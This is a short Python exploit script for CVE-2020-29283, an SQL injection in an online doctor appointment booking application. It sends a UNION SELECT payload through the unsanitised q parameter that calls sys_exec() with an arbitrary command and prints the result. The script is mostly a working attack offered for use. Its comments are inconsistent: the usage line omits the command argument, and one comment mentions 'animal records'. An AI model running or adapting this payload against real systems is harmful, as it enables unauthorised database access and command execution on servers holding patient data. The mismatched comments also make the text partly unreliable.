# CVE: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-29283
# An SQL injection vulnerability was discovered in Online Doctor Appointment Booking System PHP and Mysql via the q parameter to getuser.php.
#
# How to run the exploit?
# python3 exploit.py 127.0.0.1 80
#
# Exploit: https://github.com/BigTiger2020/Online-Doctor-Appointment-Booking-System-PHP/blob/main/README.md
# How it works?
# 1. Views user details
# 2. `q` param is not sanitized

import sys
import requests

if __name__ == '__main__':
    host = sys.argv[1]
    port = sys.argv[2]
    cmd  = sys.argv[3]

    # view user details, send SQL payload
    view_user_url = 'http://%s:%s/das/getuser.php' % (host, port)
    form_data = {
        'q': "1' UNION SELECT 1,2,3,4,5,(SELECT sys_exec('%s')) #" % cmd
    }
    res = requests.get(view_user_url, params=form_data)
    # Dumps all animal records
    print(res.text)
